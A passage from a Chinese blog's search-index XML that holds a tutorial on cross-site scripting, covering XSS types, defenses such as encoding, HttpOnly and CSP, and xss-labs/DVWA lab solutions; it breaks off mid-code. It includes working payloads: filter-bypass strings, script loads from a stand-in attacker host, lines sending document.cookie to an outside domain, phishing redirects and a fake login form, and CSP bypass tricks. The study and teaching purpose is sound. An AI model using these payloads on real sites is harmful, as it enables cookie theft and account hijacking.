<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2022/08/25/XSS%E6%94%BB%E5%87%BB/"/>
      <url>/2022/08/25/XSS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Ⅰ、什么是XSS"><a href="#Ⅰ、什么是XSS" class="headerlink" title="Ⅰ、什么是XSS"></a>Ⅰ、什么是XSS</h1><p>跨站脚本攻击（Cross Site Scripting）本来的缩写为CSS，为了与层叠样式表（Cascading Style Sheets，CSS）的缩写进行区分，将跨站脚本攻击缩写为XSS。因此XSS是跨站脚本的意思。</p><p>XSS跨站脚本攻击（Cross Site Scripting），的本质是攻击者在web页面插入恶意的script代码（这个代码可以是JS脚本、CSS样式或者其他意料之外的代码）。</p><p>当用户浏览该页面之时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。</p><p>比如读取cookie，session，token，或者网站其他敏感的网站信息，对用户进行钓鱼欺诈等。</p><h1 id="Ⅱ、XSS危害"><a href="#Ⅱ、XSS危害" class="headerlink" title="Ⅱ、XSS危害"></a>Ⅱ、XSS危害</h1><p>xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，且主要就是用来执行js获取用户信息（比如浏览器版本等等）。然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。</p><p>1、网络钓鱼，包括盗取各类用户账号；</p><p>2、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</p><p>3、劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；</p><p>4、强制弹出广告页面、刷流量等；</p><p>5、网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等；</p><p>6、进行大量的客户端攻击，如DDoS攻击；</p><p>7、获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</p><p>8、控制受害者机器向其他网站发起攻击；</p><p>9、结合其他漏洞，如CSRF漏洞，实施进一步作恶；</p><p>10、提升用户权限，包括进一步渗透网站；</p><p>11、传播跨站脚本蠕虫等；</p><h3 id="新浪微博xss攻击"><a href="#新浪微博xss攻击" class="headerlink" title="新浪微博xss攻击"></a>新浪微博xss攻击</h3><p>[XSS跨站脚本攻击实例讲解，新浪微博XSS漏洞过程分析](<a href="https://www.cnblogs.com/52php/p/5659859.html#:~:text=%E6%98%AF">https://www.cnblogs.com/52php/p/5659859.html#:~:text=是</a> 巨大的。-,新浪微博遭受XSS攻击实例分析,-通过以上对)</p><h1 id="Ⅲ、XSS攻击分类"><a href="#Ⅲ、XSS攻击分类" class="headerlink" title="Ⅲ、XSS攻击分类"></a>Ⅲ、XSS攻击分类</h1><p>XSS大致分为：反射型、存储型、DOM型（这三种为主流）</p><h2 id="一、反射型XSS"><a href="#一、反射型XSS" class="headerlink" title="一、反射型XSS"></a>一、反射型XSS</h2><p>只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。</p><p>反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索，跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/dosomething?message=&quot;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacktest.com:8002/xss/hacker.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?param=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POST的内容也可以触发反射型XSS，只不过它的触发条件比较苛刻（构建表单提交页面，并引导用户点击），所以非常少见。</p><p><code>练习：[less-1](http://localhost/xss-labs/level1.php?name=test)</code></p><p><strong>反射型XSS的攻击步骤</strong></p><ol><li>攻击者构造出特殊的URL，其中包含恶意代码</li><li>用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作</li></ol><p><img src="https://secure2.wostatic.cn/static/uBpKzD2P89urqaozkvq3Rv/image.png"></p><p><strong>防御反射型XSS攻击</strong></p><ol><li>对输入检查对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。</li><li>对输出进行转义再显示通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。比如下面的方式:</li></ol><h2 id="二、存储型XSS"><a href="#二、存储型XSS" class="headerlink" title="二、存储型XSS"></a>二、存储型XSS</h2><p>会把用户输入的数据”存储”在服务器端，也叫”持久型xss”，常见留言板等可以提交展示用户输入内容的功能点。</p><p>恶意脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型和DOM型XSS更大。存储型XSS攻击的原因仍然是没有做好数据过滤：前端提交数据至服务器端时，没有做好过滤;服务端在按受到数据时，在存储之前，没有做过滤;前端从服务器端请求到数据，没有过滤输出。</p><p><strong>存储型XSS的攻击步骤</strong></p><ol><li>攻击者将恶意代码提交到目标网站的数据库中</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作</li></ol><p><strong>预防存储型XSS攻击</strong></p><p>预防存储型XSS攻击也是从输入和输出两个方面来考虑</p><ul><li>服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符</li><li>前端接收到服务器传递过来的数据，在展示到页面前，先进行转义&#x2F;过滤</li></ul><p><code>练习： [http://kypt8004.ia.aqlab.cn/Feedback.asp](http://kypt8004.ia.aqlab.cn/Feedback.asp)</code></p><h2 id="三、DOM型XSS"><a href="#三、DOM型XSS" class="headerlink" title="三、DOM型XSS"></a>三、DOM型XSS</h2><p>从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。</p><p>1、<strong>DOM简介</strong></p><p>DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p><p>首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><p>如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> pos=<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">decodeURI</span>(<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">substring</span>(pos,<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="property">length</span>)));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从代码层面看，漏洞形成原因很简单，<code>document.URL</code>获取用户输入，在代码中未经过任何过滤就传递给了<code>document.write</code>输出到当前页面中。</p><p>当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中：</p><p>也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS：</p><p><img src="https://secure2.wostatic.cn/static/vaAdEFp4bJnYSvoT4QjeGi/image.png"></p><p><a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">浅析DOM型XSS</a></p><p><strong>DOM型XSS攻击步骤</strong></p><ol><li>攻击者构造出特殊URL，其中包含恶意代码</li><li>用户浏览器执行了恶意代码</li><li>恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作</li></ol><aside><p>💡 <strong>注意：</strong>无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。</p></aside><h1 id="Ⅳ、XSS-平台"><a href="#Ⅳ、XSS-平台" class="headerlink" title="Ⅳ、XSS 平台"></a>Ⅳ、XSS 平台</h1><p><a href="http://xsscom.com//index.php"></a></p><p>beefxss</p><h1 id="Ⅴ、XSS-labs靶场题解"><a href="#Ⅴ、XSS-labs靶场题解" class="headerlink" title="Ⅴ、XSS-labs靶场题解"></a>Ⅴ、XSS-labs靶场题解</h1><p><a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html">xss靶场之xss-labs</a></p><p>一般反射型xss：<a href="http://localhost/xss-labs/level1.php?name=test">http://localhost/xss-labs/level1.php?name=test</a></p><p>提示：未进行任何过滤，可直接xss</p><p>payload：<script>alert(1)</script></p><p>闭合元素型：<a href="http://localhost/xss-labs/level2.php?keyword=test">http://localhost/xss-labs/level2.php?keyword=test</a></p><p>提示：输出进行了字符串格式化过滤，但是输入框内容未清空，可以闭合输入框</p><p>payload：”&gt;<script>alert(1)</script>&#x2F;&#x2F;</p><p>js事件型：<a href="http://localhost/xss-labs/level3.php?keyword=&submit=%E6%90%9C%E7%B4%A2">http://localhost/xss-labs/level3.php?keyword=&submit=搜索</a></p><p>提示：特殊符号实体化，将&lt;进行了实体化</p><p>payload：’onclick&#x3D;alert(‘xss’) ‘</p><p>dvwa-low-reflect</p><p>payload:<script>alert(1)</script></p><p>dvwa-medium-rel</p><p>payload</p><p>只删除<script>标签的情况是很容易绕过的：</p><p>1.使用双写绕过，输入</p><p><scr<script>ipt>alert(document.cookie)</script></p><p>2.使用大小写绕过，输入</p><sCript>alert(document.cookie)</script><p>3.输入其他标签，如</p><IMG src=1 onerror=alert(document.cookie)><p>dvwa-high-reflect</p><p>虽然<script>标签不管用了，但是可以使用其他标签绕过</p><p>输入<IMG src=1 onerror=alert(document.cookie)></p><p>同样得到Medium级别的结果</p><p><a href="https://segmentfault.com/a/1190000019484055">DVWA-从入门到放弃之XSS(Reflected,Stored,DOM)</a></p><h1 id="Ⅵ、XSS防御"><a href="#Ⅵ、XSS防御" class="headerlink" title="Ⅵ、XSS防御"></a>Ⅵ、XSS防御</h1><h2 id="一、验证输入-OR-验证输出"><a href="#一、验证输入-OR-验证输出" class="headerlink" title="一、验证输入 OR 验证输出"></a>一、<strong>验证输入 OR 验证输出</strong></h2><p><strong>通过客户端及服务端对输入的内容进行判断：</strong></p><p>例如：</p><p>判断用户输入的手机号是否为11位数字</p><p>判断用户姓名是否全为汉字</p><p>判断输入的邮箱是否为标准邮箱格式</p><p><strong>通过对输出的内容进行检查：</strong></p><p>1、HTML-Encoder</p><p>将原本可以执行的标签代码等，转化为只能作为文本输出的内容</p><figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; // 在浏览器中作为js代码/网站标签执行</span><br><span class="line">转化为</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; // 直接在浏览器中作为文本输出</span><br></pre></td></tr></table></figure><p>2、js-Encoder</p><p>将$var中除了数字、字母外的所有字符进行十六进制化处理，使得浏览器最终输出结果上是一样的，但能够防止注入的JavaScript执行。</p><figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);&quot;</span><br><span class="line">转化为</span><br><span class="line">\x22\x3balert\x281\x29\x3b\x22</span><br></pre></td></tr></table></figure><h2 id="二、检测与过滤"><a href="#二、检测与过滤" class="headerlink" title="二、检测与过滤"></a>二、检测与过滤</h2><p>黑白名单检测判断输入是否合法</p><p>过滤用户输入的不合法的字词例如<script>、javascript、alert等</p><h2 id="三、HttpOnly"><a href="#三、HttpOnly" class="headerlink" title="三、HttpOnly"></a>三、<strong>HttpOnly</strong></h2><p>设置 cookie 时加入 HttpOnly 可使 js 脚本无法获取 cookie</p><p>如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，对于 document.cookie 来说是透明的。</p><h2 id="四、CSP（Content-Security-Policy）"><a href="#四、CSP（Content-Security-Policy）" class="headerlink" title="四、CSP（Content Security Policy）"></a>四、<strong>CSP（Content Security Policy）</strong></h2><p>面对 XSS 这样一个很普遍的问题，W3C 提出了 <strong>CSP（Content Security Policy，内容安全策略）</strong>来提升 Web 的安全性。所谓 CSP，就是在服务端返回的 HTTP header 里面添加一个 Content-Security-Policy 选项，然后定义资源的白名单域名。浏览器就会识别这个字段，并限制对非白名单资源的访问。</p><p>那我们为什么要限制外域资源的访问呢？<strong>这是因为 XSS 通常会受到长度的限制，导致黑客无法提交一段完整的 JavaScript 代码</strong>。为了解决这个问题，<strong>黑客会采取引用一个外域 JavaScript 资源的方式来进行注入</strong>。除此之外，限制了外域资源的访问，也就限制了黑客通过资源请求的方式，<strong>绕过 SOP 发送 GET 请求</strong>。目前，CSP 还是受到了大部分浏览器支持的，只要用户使用的是最新的浏览器，基本都能够得到很好的保护。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">未对参数进行任何过滤的</span><br><span class="line">        payload:</span><br><span class="line">        &lt;script&gt;<span class="title function_ invoke__">alert</span>()&lt;/script&gt;</span><br><span class="line">        &lt;img src=<span class="number">1</span> onerror=<span class="title function_ invoke__">alert</span>()&gt;</span><br><span class="line">    payload被引号包裹的</span><br><span class="line">        例如：&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line">        方式一</span><br><span class="line">            闭合标签和字符串</span><br><span class="line">            先闭合引号，对于标签中不能包含script标签的，在闭合此标签</span><br><span class="line">            payload:</span><br><span class="line">                 <span class="string">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>   (在最后加引号是因为引号总是成对出现的，这个引号是为了闭合原input标签中value属性值的最后一个引号)</span><br><span class="line">        方式二</span><br><span class="line">            向标签中添加属性和方法</span><br><span class="line">            先闭合引号，在向input标签中添加onclick方法和type属性，这样点击文本框时就可以执行代码。</span><br><span class="line">            payload：<span class="string">&quot; onclick=alert() type=&quot;</span>text<span class="string">&quot; &quot;</span></span><br><span class="line">    payload被更改的</span><br><span class="line">            如果网页对script和onclick对做了防范，</span><br><span class="line">            例如我们的payload为：<span class="string">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;</span></span><br><span class="line">            注入到页面的效果为：&lt;input name=keyword  value=<span class="string">&quot;&lt;scr_ipt&gt;&quot;</span>&gt;</span><br><span class="line">            若选用向标签中添加onclick方法的方式，onclick会被更改为o_nclick</span><br><span class="line">            我们可以先屏蔽注入点初的标签，改用在页面中插入a标签</span><br><span class="line">            payload:</span><br><span class="line">            <span class="string">&quot;&gt;&lt;a href=javascript:alert()&gt;这里是超链&lt;/a&gt;</span></span><br><span class="line"><span class="string">            href值为javascript:是目的是为了防止链接跳转，这里可以利用一下来执行js代码</span></span><br><span class="line"><span class="string">    payload被更改但不要求大小写的</span></span><br><span class="line"><span class="string">            和刚刚一样，若我们的onclick注入到页面中被更改为o_nclick,我们可以更改一下大小写</span></span><br><span class="line"><span class="string">            payload：&quot;</span> Onclick=<span class="title function_ invoke__">alert</span>() type=<span class="string">&quot;text&quot;</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    清空payload关键字的</span></span><br><span class="line"><span class="string">            若我们的payload为</span></span><br><span class="line"><span class="string">            &quot;</span>&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>()&lt;/script&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">            注入到页面的效果为</span></span><br><span class="line"><span class="string">            &quot;</span>&gt;&lt;&gt;<span class="title function_ invoke__">alert</span>()&lt;/&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">            可以看到我们的关键字script被清楚，此时可以采用复写的防止绕过</span></span><br><span class="line"><span class="string">            在script中在插入一个script</span></span><br><span class="line"><span class="string">            payload:</span></span><br><span class="line"><span class="string">            &quot;</span>&gt;&lt;scrscriptipt&gt;<span class="title function_ invoke__">alert</span>()&lt;/sscriptcript&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">            浏览器将script中插入的script清楚后，我们之前的script依然存在</span></span><br><span class="line"><span class="string">            输入到页面的效果为：&quot;</span>&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>()&lt;/script&gt;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>重定向钓鱼：</p><script>document.location="[http://www.baidu.com](http://www.baidu.com/)"</script><p>iframe钓鱼：</p><iframe src="[http://www.baidu.com](http://www.baidu.com/)" height="100%" width="100%"</iframe><p>HTML注入钓鱼：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=<span class="string">&quot;text-align:center;&quot;</span>&gt;&lt;form Method=<span class="string">&quot;POST&quot;</span> Action=<span class="string">&quot;LPXR.php&quot;</span> Name=<span class="string">&quot;form&quot;</span>&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=<span class="string">&quot;login&quot;</span> /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=<span class="string">&quot;Password&quot;</span> type=<span class="string">&quot;password&quot;</span> /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=<span class="string">&quot;Valid&quot;</span> value=<span class="string">&quot;Ok&quot;</span> type=<span class="string">&quot;submit&quot;</span> /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>比赛中常见的绕过 CSP</strong></p><h3 id="启用方式"><a href="#启用方式" class="headerlink" title="启用方式"></a>启用方式</h3><ol><li>通过HTTP头部得<code>Content-Security-Policy</code>字段</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object</span>-src <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><ol start="2"><li>通过HTML标签<code>&lt;meta&gt;</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="CSP常用指令"><a href="#CSP常用指令" class="headerlink" title="CSP常用指令"></a><strong>CSP常用指令</strong></h3><p>CSP会限制以下资源的加载：</p><ul><li><strong>child-src</strong>：指定定义了 web workers 以及嵌套的浏览上下文（如<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>）的源</li><li><strong>connect-src</strong>：限制能通过脚本接口加载的URL。</li><li><strong>font-src</strong> ：定义了字体加载的有效来源</li><li><strong>img-src</strong> ：定义了图片或者图标加载的有效来源</li><li><strong>media-src</strong>： 定义了媒体文件加载的有效来源如HTML6的 <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>等元素</li><li><strong>object-src</strong>：限制<code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>或者<code>&lt;applet&gt;</code>标签的源地址。</li><li><strong>style-src</strong> ：定义页面中CSS样式的有效来源</li><li><strong>script-src</strong> ：定义页面中javascript有效来源</li><li><strong>worker-src</strong>：限制Worker、SharedWorker或者ServiceWorker脚本源。</li><li><strong>manifest-src</strong>： 限制应用声明文件的源地址。</li><li><strong>frame-src：</strong> 设置允许通过类似<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>标签加载的内嵌内容的源地址。</li><li><strong>default-src</strong>：定义了那些没有被更精确指令指定的安全策略。</li></ul><blockquote><p>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值。</p></blockquote><h3 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a><strong>选项值</strong></h3><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p><ul><li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li><li>路径名：<code>example.org/resources/js/</code></li><li>通配符：<code>.example.org</code>，<code>://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li><li>协议名：<code>https:</code>、<code>data:</code></li><li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li><li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li></ul><h3 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a><strong>script-src 的特殊值</strong></h3><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p><ul><li>**<code>&#39;unsafe-inline&#39;</code>**：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li><li><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li><li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行。但是这个随机字符串，应当是唯一，不应该是写死的。如果是固定的nonce值，那么nonce没有任何意义，因为攻击者可以将自己注入的script标签也添加上相同的nonce值。</li></ul><p>目前在比赛中常见的绕过 CSP 一般是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">script-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span></span><br><span class="line"></span><br><span class="line">script-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-eval&#x27;</span></span><br><span class="line"></span><br><span class="line">script-src <span class="string">&#x27;nonce-*&#x27;</span></span><br><span class="line"></span><br><span class="line">xx-srcself</span><br></pre></td></tr></table></figure><h3 id="script-src-self-unsafe-inline"><a href="#script-src-self-unsafe-inline" class="headerlink" title="script-src 'self' 'unsafe-inline'"></a>script-src 'self' 'unsafe-inline'</h3><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;https://www.XXX.com/x.php?c=[cookie]&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;//www.XXX.com/?&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://www.XXX.com/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>内嵌script都可以执行，当然可以直接执行本页面的JS，如输入即可，这里的利用和XSS利用一致，</p><h3 id="script-src-self-unsafe-eval"><a href="#script-src-self-unsafe-eval" class="headerlink" title="script-src 'self' 'unsafe-eval'"></a><strong>script-src 'self' 'unsafe-eval'</strong></h3><p>重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的ppt，上面总结了可以被用来绕过CSP的一些JS库。</p><p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="绕过script-src-nonce"><a href="#绕过script-src-nonce" class="headerlink" title="绕过script-src 'nonce-*'"></a><strong>绕过script-src 'nonce-*'</strong></h3><p><strong>利用浏览器补全绕过script nonce</strong></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:<span class="keyword">default</span>-src <span class="string">&#x27;none&#x27;</span>;script-src <span class="string">&#x27;nonce-xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。</p><p>如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span 